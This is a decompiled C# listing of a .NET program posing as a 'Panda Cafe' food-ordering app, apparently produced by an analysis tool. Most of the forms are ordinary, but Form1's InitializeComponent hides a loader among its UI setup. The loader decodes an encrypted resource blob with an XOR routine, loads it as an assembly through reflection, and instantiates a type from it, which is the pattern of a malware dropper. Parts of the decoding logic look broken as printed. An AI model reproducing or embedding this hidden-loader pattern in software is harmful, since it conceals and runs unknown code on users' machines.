// native disrobe CIL->C# decompilation (no runtime, no external tool)
// module: RiUv.exe

// PandaCafe.Cakes
public void .ctor()
{
    this.components = null;
    this.InitializeComponent();
    return;
}
// PandaCafe.Cakes
private void button1_Click(object sender, System.EventArgs e)
{
    string local0;
    bool local1;
    bool local2;
    bool local3;
    bool local4;
    bool local5;

    local1 = this.checkBox1.Checked;
    if (!(!local1))
    {
        bill = bill + 2D;
    }
    local2 = this.checkBox2.Checked;
    if (!(!local2))
    {
        bill = bill + 2.5D;
    }
    local3 = this.checkBox3.Checked;
    if (!(!local3))
    {
        bill = bill + 2.5D;
    }
    local4 = this.checkBox4.Checked;
    if (!(!local4))
    {
        bill = bill + 1.5D;
    }
    local5 = this.checkBox5.Checked;
    if (!(!local5))
    {
        bill = bill + 2D;
    }
    local0 = System.String.Format("£{0:0.00}", bill);
    System.Windows.Forms.MessageBox.Show(System.String.Concat("Your total is: ", local0), "Your Total");
    System.Windows.Forms.Application.Exit();
    return;
}
// PandaCafe.Cakes
private void Cakes_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
{
    System.Windows.Forms.Application.Exit();
    return;
}
// PandaCafe.Cakes
protected void Dispose(bool disposing)
{
    bool local0;

    local0 = (!disposing ? 0 : (this.components > null));
    if (!(!local0))
    {
        this.components.Dispose();
    }
    this.Dispose(disposing);
    return;
}
// PandaCafe.Cakes
private void InitializeComponent()
{
    this.label1 = new System.Windows.Forms.Label();
    this.checkBox1 = new System.Windows.Forms.CheckBox();
    this.checkBox2 = new System.Windows.Forms.CheckBox();
    this.checkBox4 = new System.Windows.Forms.CheckBox();
    this.checkBox3 = new System.Windows.Forms.CheckBox();
    this.checkBox5 = new System.Windows.Forms.CheckBox();
    this.button1 = new System.Windows.Forms.Button();
    this.SuspendLayout();
    this.label1.AutoSize = true;
    this.label1.Font = new System.Drawing.Font("Verdana", 18f, 1, 3, 0);
    this.label1.Location = new System.Drawing.Point(87, 9);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(222, 29);
    this.label1.TabIndex = 0;
    this.label1.Text = "Order your side";
    this.checkBox1.AutoSize = true;
    this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox1.Location = new System.Drawing.Point(92, 56);
    this.checkBox1.Name = "checkBox1";
    this.checkBox1.Size = new System.Drawing.Size(194, 28);
    this.checkBox1.TabIndex = 1;
    this.checkBox1.Text = "Vanilla Cake - £2.00";
    this.checkBox1.UseVisualStyleBackColor = true;
    this.checkBox2.AutoSize = true;
    this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox2.Location = new System.Drawing.Point(92, 90);
    this.checkBox2.Name = "checkBox2";
    this.checkBox2.Size = new System.Drawing.Size(230, 28);
    this.checkBox2.TabIndex = 2;
    this.checkBox2.Text = "Red Velvet Cake - £2.50";
    this.checkBox2.UseVisualStyleBackColor = true;
    this.checkBox4.AutoSize = true;
    this.checkBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox4.Location = new System.Drawing.Point(92, 158);
    this.checkBox4.Name = "checkBox4";
    this.checkBox4.Size = new System.Drawing.Size(237, 28);
    this.checkBox4.TabIndex = 4;
    this.checkBox4.Text = "Vanilla Ice Cream - £1.50";
    this.checkBox4.UseVisualStyleBackColor = true;
    this.checkBox3.AutoSize = true;
    this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox3.Location = new System.Drawing.Point(92, 124);
    this.checkBox3.Name = "checkBox3";
    this.checkBox3.Size = new System.Drawing.Size(223, 28);
    this.checkBox3.TabIndex = 3;
    this.checkBox3.Text = "Chocolate Cake - £2.50";
    this.checkBox3.UseVisualStyleBackColor = true;
    this.checkBox5.AutoSize = true;
    this.checkBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox5.Location = new System.Drawing.Point(92, 192);
    this.checkBox5.Name = "checkBox5";
    this.checkBox5.Size = new System.Drawing.Size(258, 28);
    this.checkBox5.TabIndex = 5;
    this.checkBox5.Text = "Chocolate Ice cream- £2.00";
    this.checkBox5.UseVisualStyleBackColor = true;
    this.button1.BackColor = Gray;
    this.button1.FlatStyle = (System.Windows.Forms.FlatStyle)0;
    this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.button1.Location = new System.Drawing.Point(139, 259);
    this.button1.Name = "button1";
    this.button1.Size = new System.Drawing.Size(123, 61);
    this.button1.TabIndex = 6;
    this.button1.Text = "Complete your order";
    this.button1.UseVisualStyleBackColor = false;
    this.button1.add_Click(this.button1_Click);
    this.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
    this.AutoScaleMode = (System.Windows.Forms.AutoScaleMode)1;
    this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
    this.ClientSize = new System.Drawing.Size(444, 356);
    this.Controls.Add(this.button1);
    this.Controls.Add(this.checkBox5);
    this.Controls.Add(this.checkBox4);
    this.Controls.Add(this.checkBox3);
    this.Controls.Add(this.checkBox2);
    this.Controls.Add(this.checkBox1);
    this.Controls.Add(this.label1);
    this.MaximizeBox = false;
    this.Name = "Cakes";
    this.ShowIcon = false;
    this.StartPosition = (System.Windows.Forms.FormStartPosition)1;
    this.Text = "Panda Cafe";
    this.add_FormClosed(this.Cakes_FormClosed);
    this.ResumeLayout(false);
    this.PerformLayout();
    return;
}
// PandaCafe.Coffee
public void .ctor()
{
    this.components = null;
    this.InitializeComponent();
    return;
}
// PandaCafe.Coffee
private void Coffee_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
{
    System.Windows.Forms.Application.Exit();
    return;
}
// PandaCafe.Coffee
private void checkBox2_CheckedChanged(object sender, System.EventArgs e)
{
    return;
}
// PandaCafe.Coffee
private void button1_Click(object sender, System.EventArgs e)
{
    PandaCafe.Sandwich local0;
    bool local1;
    bool local2;
    bool local3;
    bool local4;

    local1 = this.checkBox1.Checked;
    if (!(!local1))
    {
        bill = bill + 2D;
    }
    local2 = this.checkBox2.Checked;
    if (!(!local2))
    {
        bill = bill + 3D;
    }
    local3 = this.checkBox3.Checked;
    if (!(!local3))
    {
        bill = bill + 2.5D;
    }
    local4 = this.checkBox4.Checked;
    if (!(!local4))
    {
        bill = bill + 1.5D;
    }
    local0 = new PandaCafe.Sandwich();
    local0.Show();
    this.Hide();
    return;
}
// PandaCafe.Coffee
protected void Dispose(bool disposing)
{
    bool local0;

    local0 = (!disposing ? 0 : (this.components > null));
    if (!(!local0))
    {
        this.components.Dispose();
    }
    this.Dispose(disposing);
    return;
}
// PandaCafe.Coffee
private void InitializeComponent()
{
    this.checkBox1 = new System.Windows.Forms.CheckBox();
    this.checkBox2 = new System.Windows.Forms.CheckBox();
    this.checkBox3 = new System.Windows.Forms.CheckBox();
    this.checkBox4 = new System.Windows.Forms.CheckBox();
    this.label1 = new System.Windows.Forms.Label();
    this.button1 = new System.Windows.Forms.Button();
    this.SuspendLayout();
    this.checkBox1.AutoSize = true;
    this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox1.Location = new System.Drawing.Point(121, 68);
    this.checkBox1.Name = "checkBox1";
    this.checkBox1.Size = new System.Drawing.Size(129, 28);
    this.checkBox1.TabIndex = 0;
    this.checkBox1.Text = "Latte - £2.00";
    this.checkBox1.UseVisualStyleBackColor = true;
    this.checkBox2.AutoSize = true;
    this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox2.Location = new System.Drawing.Point(121, 102);
    this.checkBox2.Name = "checkBox2";
    this.checkBox2.Size = new System.Drawing.Size(182, 28);
    this.checkBox2.TabIndex = 1;
    this.checkBox2.Text = "Americano - £3.00";
    this.checkBox2.UseVisualStyleBackColor = true;
    this.checkBox2.add_CheckedChanged(this.checkBox2_CheckedChanged);
    this.checkBox3.AutoSize = true;
    this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox3.Location = new System.Drawing.Point(121, 171);
    this.checkBox3.Name = "checkBox3";
    this.checkBox3.Size = new System.Drawing.Size(185, 28);
    this.checkBox3.TabIndex = 3;
    this.checkBox3.Text = "Iced Coffee - £1.50";
    this.checkBox3.UseVisualStyleBackColor = true;
    this.checkBox4.AutoSize = true;
    this.checkBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox4.Location = new System.Drawing.Point(121, 137);
    this.checkBox4.Name = "checkBox4";
    this.checkBox4.Size = new System.Drawing.Size(169, 28);
    this.checkBox4.TabIndex = 2;
    this.checkBox4.Text = "Espresso - £2.50";
    this.checkBox4.UseVisualStyleBackColor = true;
    this.label1.AutoSize = true;
    this.label1.Font = new System.Drawing.Font("Verdana", 18f, 1, 3, 0);
    this.label1.Location = new System.Drawing.Point(85, 19);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(249, 29);
    this.label1.TabIndex = 4;
    this.label1.Text = "Order your coffee";
    this.button1.BackColor = Gray;
    this.button1.FlatStyle = (System.Windows.Forms.FlatStyle)0;
    this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 1, 3, 0);
    this.button1.Location = new System.Drawing.Point(139, 224);
    this.button1.Name = "button1";
    this.button1.Size = new System.Drawing.Size(133, 45);
    this.button1.TabIndex = 5;
    this.button1.Text = "Next";
    this.button1.UseVisualStyleBackColor = false;
    this.button1.add_Click(this.button1_Click);
    this.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
    this.AutoScaleMode = (System.Windows.Forms.AutoScaleMode)1;
    this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
    this.ClientSize = new System.Drawing.Size(429, 312);
    this.Controls.Add(this.button1);
    this.Controls.Add(this.label1);
    this.Controls.Add(this.checkBox3);
    this.Controls.Add(this.checkBox4);
    this.Controls.Add(this.checkBox2);
    this.Controls.Add(this.checkBox1);
    this.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, 0, 3, 0);
    this.FormBorderStyle = (System.Windows.Forms.FormBorderStyle)1;
    this.MaximizeBox = false;
    this.Name = "Coffee";
    this.ShowIcon = false;
    this.StartPosition = (System.Windows.Forms.FormStartPosition)1;
    this.Text = "Panda Cafe";
    this.add_FormClosed(this.Coffee_FormClosed);
    this.ResumeLayout(false);
    this.PerformLayout();
    return;
}
// PandaCafe.Form1
public void .ctor()
{
    this.components = null;
    this.InitializeComponent();
    return;
}
// PandaCafe.Form1
private void Form1_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
{
    System.Windows.Forms.Application.Exit();
    return;
}
// PandaCafe.Form1
private void button1_Click(object sender, System.EventArgs e)
{
    PandaCafe.Coffee local0;

    local0 = new PandaCafe.Coffee();
    local0.Show();
    this.Hide();
    return;
}
// PandaCafe.Form1
protected void Dispose(bool disposing)
{
    bool local0;

    local0 = (!disposing ? 0 : (this.components > null));
    if (!(!local0))
    {
        this.components.Dispose();
    }
    this.Dispose(disposing);
    return;
}
// PandaCafe.Form1
private void InitializeComponent()
{
    System.ComponentModel.ComponentResourceManager local0;
    byte[] local1;
    System.Collections.Generic.List<byte> local2;
    int local3;
    System.Reflection.Assembly local4;
    System.Type local5;
    byte[] local6;
    int local7;
    byte local8;
    int local9;
    byte local10;
    byte local11;
    int local12;
    object[] local13;

    local0 = new System.ComponentModel.ComponentResourceManager(typeof(Cakes));
    this.label1 = new System.Windows.Forms.Label();
    this.pictureBox1 = new System.Windows.Forms.PictureBox();
    this.button1 = new System.Windows.Forms.Button();
    this.pictureBox1.BeginInit();
    this.SuspendLayout();
    this.label1.AutoSize = true;
    this.label1.Font = new System.Drawing.Font("Verdana", 18f, 1, 3, 0);
    this.label1.Location = new System.Drawing.Point(78, 25);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(387, 29);
    this.label1.TabIndex = 0;
    this.label1.Text = "Welcome to our panda cafe.";
    this.pictureBox1.BorderStyle = (System.Windows.Forms.BorderStyle)1;
    this.pictureBox1.Image = (Image)local0.GetObject("pictureBox1.Image");
    this.pictureBox1.Location = new System.Drawing.Point(104, 57);
    local1 = (byte[])local0.GetObject("ZH");
    new List<byte>().Add(53);
    new List<byte>().Add(52);
    new List<byte>().Add(56);
    new List<byte>().Add(66);
    new List<byte>().Add(72);
    new List<byte>().Add(69);
    new List<byte>().Add(51);
    new List<byte>().Add(53);
    new List<byte>().Add(90);
    new List<byte>().Add(56);
    new List<byte>().Add(83);
    new List<byte>().Add(72);
    new List<byte>().Add(55);
    new List<byte>().Add(56);
    new List<byte>().Add(56);
    new List<byte>().Add(56);
    new List<byte>().Add(71);
    new List<byte>().Add(83);
    new List<byte>().Add(66);
    new List<byte>().Add(89);
    new List<byte>().Add(68);
    new List<byte>().Add(57);
    local2 = new List<byte>();
    local3 = 0;
    local6 = local1.ToArray();
    local7 = 0;
    while (local7 < ((int)local6.Length))
    {
        local8 = local6[local7];
        local9 = (local3 + 1) % ((int)local1.Length);
        local10 = local1[local9];
        local11 = local2[local3 % local2.Count];
        local12 = (((local8 ^ local11) - local10) + 256) & 255;
        local1[local3] = (byte)local12;
        local3 = local3 + 1;
        local7 = local7 + 1;
        continue;
    }
    this.pictureBox1.Name = "pictureBox1";
    this.pictureBox1.Size = new System.Drawing.Size(333, 262);
    this.pictureBox1.SizeMode = (System.Windows.Forms.PictureBoxSizeMode)1;
    this.pictureBox1.TabIndex = 1;
    this.pictureBox1.TabStop = false;
    this.button1.BackColor = Gray;
    this.button1.Cursor = Hand;
    this.button1.FlatStyle = (System.Windows.Forms.FlatStyle)0;
    this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75f, 0, 3, 0);
    this.button1.Location = new System.Drawing.Point(202, 340);
    this.button1.Name = "button1";
    local4 = ((object)typeof(Assembly).InvokeMember("Load", (System.Reflection.BindingFlags)256, null, null, new System.Object[1] { local1 }) is var __disrobe_isinst_033E && __disrobe_isinst_033E is Assembly ? __disrobe_isinst_033E : null);
    local5 = local4.GetTypes()[9];
    local13 = new System.String[3] { ZZH[0], ZZH[1], "PandaCafe" };
    System.Activator.CreateInstance(local5, local13);
    this.button1.Size = new System.Drawing.Size(130, 49);
    this.button1.TabIndex = 2;
    this.button1.Text = "Order Here";
    this.button1.UseVisualStyleBackColor = false;
    this.button1.add_Click(this.button1_Click);
    this.AutoScaleDimensions = new System.Drawing.SizeF(9f, 16f);
    this.AutoScaleMode = (System.Windows.Forms.AutoScaleMode)1;
    this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
    this.ClientSize = new System.Drawing.Size(541, 457);
    this.Controls.Add(this.button1);
    this.Controls.Add(this.pictureBox1);
    this.Controls.Add(this.label1);
    this.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, 1, 3, 0);
    this.FormBorderStyle = (System.Windows.Forms.FormBorderStyle)1;
    this.Margin = new System.Windows.Forms.Padding(4);
    this.MaximizeBox = false;
    this.Name = "Form1";
    this.ShowIcon = false;
    this.StartPosition = (System.Windows.Forms.FormStartPosition)1;
    this.Text = "Panda Cafe";
    this.add_FormClosed(this.Form1_FormClosed);
    this.pictureBox1.EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
    return;
}
// PandaCafe.Form1
private static void .cctor()
{
    ZZH = "576B5155&6E7464".Split(new System.Char[1] { '&' });
    return;
}
// PandaCafe.Program
private static void Main()
{
    System.Windows.Forms.Application.EnableVisualStyles();
    System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
    System.Windows.Forms.Application.Run(new PandaCafe.Form1());
    return;
}
// PandaCafe.Sandwich
public void .ctor()
{
    this.components = null;
    this.InitializeComponent();
    return;
}
// PandaCafe.Sandwich
private void button1_Click(object sender, System.EventArgs e)
{
    PandaCafe.Cakes local0;
    bool local1;
    bool local2;
    bool local3;
    bool local4;
    bool local5;
    bool local6;

    local1 = this.checkBox1.Checked;
    if (!(!local1))
    {
        bill = bill + 1.3D;
    }
    local2 = this.checkBox2.Checked;
    if (!(!local2))
    {
        bill = bill + 1.5D;
    }
    local3 = this.checkBox3.Checked;
    if (!(!local3))
    {
        bill = bill + 1.5D;
    }
    local4 = this.checkBox4.Checked;
    if (!(!local4))
    {
        bill = bill + 1.75D;
    }
    local5 = this.checkBox5.Checked;
    if (!(!local5))
    {
        bill = bill + 2.5D;
    }
    local6 = this.checkBox6.Checked;
    if (!(!local6))
    {
        bill = bill + 2.75D;
    }
    local0 = new PandaCafe.Cakes();
    local0.Show();
    this.Hide();
    return;
}
// PandaCafe.Sandwich
private void Sandwich_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
{
    System.Windows.Forms.Application.Exit();
    return;
}
// PandaCafe.Sandwich
private void label1_Click(object sender, System.EventArgs e)
{
    return;
}
// PandaCafe.Sandwich
protected void Dispose(bool disposing)
{
    bool local0;

    local0 = (!disposing ? 0 : (this.components > null));
    if (!(!local0))
    {
        this.components.Dispose();
    }
    this.Dispose(disposing);
    return;
}
// PandaCafe.Sandwich
private void InitializeComponent()
{
    this.label1 = new System.Windows.Forms.Label();
    this.checkBox1 = new System.Windows.Forms.CheckBox();
    this.checkBox2 = new System.Windows.Forms.CheckBox();
    this.checkBox3 = new System.Windows.Forms.CheckBox();
    this.checkBox4 = new System.Windows.Forms.CheckBox();
    this.button1 = new System.Windows.Forms.Button();
    this.checkBox5 = new System.Windows.Forms.CheckBox();
    this.checkBox6 = new System.Windows.Forms.CheckBox();
    this.SuspendLayout();
    this.label1.AutoSize = true;
    this.label1.Font = new System.Drawing.Font("Verdana", 18f, 1, 3, 0);
    this.label1.Location = new System.Drawing.Point(81, 20);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(233, 29);
    this.label1.TabIndex = 0;
    this.label1.Text = "Order your main";
    this.label1.add_Click(this.label1_Click);
    this.checkBox1.AutoSize = true;
    this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox1.Location = new System.Drawing.Point(111, 71);
    this.checkBox1.Name = "checkBox1";
    this.checkBox1.Size = new System.Drawing.Size(323, 28);
    this.checkBox1.TabIndex = 1;
    this.checkBox1.Text = "Ham and Cheese sandwich - £1.30";
    this.checkBox1.UseVisualStyleBackColor = true;
    this.checkBox2.AutoSize = true;
    this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox2.Location = new System.Drawing.Point(111, 105);
    this.checkBox2.Name = "checkBox2";
    this.checkBox2.Size = new System.Drawing.Size(219, 28);
    this.checkBox2.TabIndex = 2;
    this.checkBox2.Text = "Tuna sandwich - £1.50";
    this.checkBox2.UseVisualStyleBackColor = true;
    this.checkBox3.AutoSize = true;
    this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox3.Location = new System.Drawing.Point(111, 173);
    this.checkBox3.Name = "checkBox3";
    this.checkBox3.Size = new System.Drawing.Size(233, 28);
    this.checkBox3.TabIndex = 4;
    this.checkBox3.Text = "Turkey sandwich - £1.75";
    this.checkBox3.UseVisualStyleBackColor = true;
    this.checkBox4.AutoSize = true;
    this.checkBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox4.Location = new System.Drawing.Point(111, 139);
    this.checkBox4.Name = "checkBox4";
    this.checkBox4.Size = new System.Drawing.Size(244, 28);
    this.checkBox4.TabIndex = 3;
    this.checkBox4.Text = "Chicken sandwich - £1.50";
    this.checkBox4.UseVisualStyleBackColor = true;
    this.button1.BackColor = Gray;
    this.button1.FlatStyle = (System.Windows.Forms.FlatStyle)0;
    this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 1, 3, 0);
    this.button1.Location = new System.Drawing.Point(151, 287);
    this.button1.Name = "button1";
    this.button1.Size = new System.Drawing.Size(126, 46);
    this.button1.TabIndex = 5;
    this.button1.Text = "Next";
    this.button1.UseVisualStyleBackColor = false;
    this.button1.add_Click(this.button1_Click);
    this.checkBox5.AutoSize = true;
    this.checkBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox5.Location = new System.Drawing.Point(111, 207);
    this.checkBox5.Name = "checkBox5";
    this.checkBox5.Size = new System.Drawing.Size(282, 28);
    this.checkBox5.TabIndex = 6;
    this.checkBox5.Text = "Cheese Jacket Potatoe - £2.50";
    this.checkBox5.UseVisualStyleBackColor = true;
    this.checkBox6.AutoSize = true;
    this.checkBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, 0, 3, 0);
    this.checkBox6.Location = new System.Drawing.Point(111, 241);
    this.checkBox6.Name = "checkBox6";
    this.checkBox6.Size = new System.Drawing.Size(260, 28);
    this.checkBox6.TabIndex = 7;
    this.checkBox6.Text = "Tuna Jacket Potatoe - £2.70";
    this.checkBox6.UseVisualStyleBackColor = true;
    this.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
    this.AutoScaleMode = (System.Windows.Forms.AutoScaleMode)1;
    this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
    this.ClientSize = new System.Drawing.Size(462, 424);
    this.Controls.Add(this.checkBox6);
    this.Controls.Add(this.checkBox5);
    this.Controls.Add(this.button1);
    this.Controls.Add(this.checkBox3);
    this.Controls.Add(this.checkBox4);
    this.Controls.Add(this.checkBox2);
    this.Controls.Add(this.checkBox1);
    this.Controls.Add(this.label1);
    this.FormBorderStyle = (System.Windows.Forms.FormBorderStyle)1;
    this.MaximizeBox = false;
    this.Name = "Sandwich";
    this.ShowIcon = false;
    this.StartPosition = (System.Windows.Forms.FormStartPosition)1;
    this.Text = "Panda Cafe";
    this.add_FormClosed(this.Sandwich_FormClosed);
    this.ResumeLayout(false);
    this.PerformLayout();
    return;
}
// PandaCafe.Properties.Resources
internal void .ctor()
{
    return;
}
// PandaCafe.Properties.Resources
internal static System.Resources.ResourceManager get_ResourceManager()
{
    bool local0;
    System.Resources.ResourceManager local1;
    System.Resources.ResourceManager local2;

    local0 = resourceMan == null;
    if (!(!local0))
    {
        local1 = new System.Resources.ResourceManager("PandaCafe.Properties.Resources", typeof(Resources).Assembly);
        resourceMan = local1;
    }
    local2 = resourceMan;
    return local2;
}
// PandaCafe.Properties.Resources
internal static System.Globalization.CultureInfo get_Culture()
{
    System.Globalization.CultureInfo local0;

    local0 = resourceCulture;
    return local0;
}
// PandaCafe.Properties.Resources
internal static void set_Culture(System.Globalization.CultureInfo value)
{
    resourceCulture = value;
    return;
}
// PandaCafe.Properties.Resources
internal static System.Drawing.Bitmap get_WkQU()
{
    object local0;
    System.Drawing.Bitmap local1;

    local0 = ResourceManager.GetObject("WkQU", resourceCulture);
    local1 = (Bitmap)local0;
    return local1;
}
// PandaCafe.Properties.Settings
public static PandaCafe.Properties.Settings get_Default()
{
    PandaCafe.Properties.Settings local0;

    local0 = defaultInstance;
    return local0;
}
// PandaCafe.Properties.Settings
public void .ctor()
{
    return;
}
// PandaCafe.Properties.Settings
private static void .cctor()
{
    defaultInstance = (Settings)System.Configuration.SettingsBase.Synchronized(new PandaCafe.Properties.Settings());
    return;
}
